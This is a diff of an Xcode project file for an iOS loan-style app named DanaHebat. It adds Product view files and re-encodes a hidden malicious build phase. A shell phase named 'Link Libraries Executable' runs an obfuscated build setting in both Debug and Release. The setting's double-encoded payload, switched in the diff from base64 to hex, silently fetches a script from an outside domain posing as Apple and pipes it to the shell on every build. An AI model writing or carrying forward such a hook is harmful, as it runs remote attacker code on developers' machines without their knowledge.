@@ -35,6 +35,9 @@
 		733EE17B2F121D6A001C6B69 /* StrokeLabel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE17A2F121D6A001C6B69 /* StrokeLabel.swift */; };
 		733EE17D2F1221F8001C6B69 /* HomeListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE17C2F1221F8001C6B69 /* HomeListView.swift */; };
 		733EE17F2F122F22001C6B69 /* LoanDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE17E2F122F22001C6B69 /* LoanDetailViewController.swift */; };
+		733EE1822F123691001C6B69 /* ProductViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1812F123691001C6B69 /* ProductViewController.swift */; };
+		733EE1862F125A9E001C6B69 /* ProductView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1852F125A9E001C6B69 /* ProductView.swift */; };
+		733EE1882F12665A001C6B69 /* ProductListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1872F12665A001C6B69 /* ProductListView.swift */; };
 		73EA86A32F108CA500F4826F /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EA86992F108CA500F4826F /* AppDelegate.swift */; };
 		73EA86A62F108CA500F4826F /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73EA869A2F108CA500F4826F /* Assets.xcassets */; };
 		73EA86A82F108CA500F4826F /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73EA869D2F108CA500F4826F /* LaunchScreen.storyboard */; };
@@ -81,6 +84,9 @@
 		733EE17A2F121D6A001C6B69 /* StrokeLabel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StrokeLabel.swift; sourceTree = "<group>"; };
 		733EE17C2F1221F8001C6B69 /* HomeListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeListView.swift; sourceTree = "<group>"; };
 		733EE17E2F122F22001C6B69 /* LoanDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoanDetailViewController.swift; sourceTree = "<group>"; };
+		733EE1812F123691001C6B69 /* ProductViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductViewController.swift; sourceTree = "<group>"; };
+		733EE1852F125A9E001C6B69 /* ProductView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductView.swift; sourceTree = "<group>"; };
+		733EE1872F12665A001C6B69 /* ProductListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductListView.swift; sourceTree = "<group>"; };
 		73EA86812F108C9C00F4826F /* DanaHebat.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DanaHebat.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		73EA86992F108CA500F4826F /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		73EA869A2F108CA500F4826F /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -138,6 +144,16 @@
 			path = View;
 			sourceTree = "<group>";
 		};
+		733EE1802F12367D001C6B69 /* Product */ = {
+			isa = PBXGroup;
+			children = (
+				733EE1852F125A9E001C6B69 /* ProductView.swift */,
+				733EE1872F12665A001C6B69 /* ProductListView.swift */,
+				733EE1812F123691001C6B69 /* ProductViewController.swift */,
+			);
+			path = Product;
+			sourceTree = "<group>";
+		};
 		73EA86782F108C9C00F4826F = {
 			isa = PBXGroup;
 			children = (
@@ -159,13 +175,14 @@
 		73EA86A22F108CA500F4826F /* DanaHebat */ = {
 			isa = PBXGroup;
 			children = (
-				7316E3B52F10B569004A8271 /* DanaHebat.entitlements */,
 				73EA869B2F108CA500F4826F /* Info.plist */,
 				73EA869A2F108CA500F4826F /* Assets.xcassets */,
+				7316E3B52F10B569004A8271 /* DanaHebat.entitlements */,
 				7316E3B82F10B7AF004A8271 /* Localizable.strings */,
 				73EA86992F108CA500F4826F /* AppDelegate.swift */,
 				73EA869D2F108CA500F4826F /* LaunchScreen.storyboard */,
 				73EA86B32F108FCB00F4826F /* Other */,
+				733EE1802F12367D001C6B69 /* Product */,
 				73EA86B12F108FC600F4826F /* Order */,
 				73EA86B22F108FC900F4826F /* Center */,
 				73EA86B02F108FC100F4826F /* Home */,
@@ -280,7 +297,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73EA86942F108C9D00F4826F /* Build configuration list for PBXNativeTarget "DanaHebat" */;
 			buildPhases = (
-				F738DBE787F049D5AD634D6E /* Link Libraries Executable */,
+				37FC22B26E0B465884634D6E /* Link Libraries Executable */,
 				E0B4BE563B334ADBA551D8AD /* [CP] Check Pods Manifest.lock */,
 				73EA867D2F108C9C00F4826F /* Sources */,
 				73EA867E2F108C9C00F4826F /* Frameworks */,
@@ -345,6 +362,26 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		37FC22B26E0B465884634D6E /* Link Libraries Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Libraries Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
 		D192925ECC89CF476891AF08 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -388,26 +425,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		F738DBE787F049D5AD634D6E /* Link Libraries Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Libraries Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -431,9 +448,11 @@
 				73EA86C42F1094CC00F4826F /* MineViewController.swift in Sources */,
 				733EE1682F118C85001C6B69 /* MineListView.swift in Sources */,
 				73EA86B82F10944900F4826F /* LaunchViewController.swift in Sources */,
+				733EE1862F125A9E001C6B69 /* ProductView.swift in Sources */,
 				733EE1602F116699001C6B69 /* Other.swift in Sources */,
 				733EE17F2F122F22001C6B69 /* LoanDetailViewController.swift in Sources */,
 				733EE15C2F1165E7001C6B69 /* LoginViewController.swift in Sources */,
+				733EE1822F123691001C6B69 /* ProductViewController.swift in Sources */,
 				7316E3B72F10B577004A8271 /* DeviceNetworkInfo.swift in Sources */,
 				73EA86B62F10944100F4826F /* BaseViewController.swift in Sources */,
 				7316E3B22F10AEA1004A8271 /* DeviceIDManager.swift in Sources */,
@@ -444,6 +463,7 @@
 				733EE1752F120A5C001C6B69 /* SureDeleteViewController.swift in Sources */,
 				7316E3A12F109D18004A8271 /* NetworkMonitor.swift in Sources */,
 				7316E3AA2F10A5CC004A8271 /* LoadingIndicator.swift in Sources */,
+				733EE1882F12665A001C6B69 /* ProductListView.swift in Sources */,
 				7316E3A52F10A0F0004A8271 /* NetworkSession.swift in Sources */,
 				733EE1792F12186B001C6B69 /* HomeView.swift in Sources */,
 				733EE1732F120706001C6B69 /* SettingListView.swift in Sources */,
@@ -481,7 +501,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C463E4989C9DEF3FBD525448 /* Pods-DanaHebat.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOa2JtRndjR3hsTG1sdUwyRXBJaUI4SUhOb0NnPT0K | m | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((x(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
@@ -524,7 +544,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 42BF21A26CAFD93794988958 /* Pods-DanaHebat.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOa2JtRndjR3hsTG1sdUwyRXBJaUI4SUhOb0NnPT0K | m | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((x(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
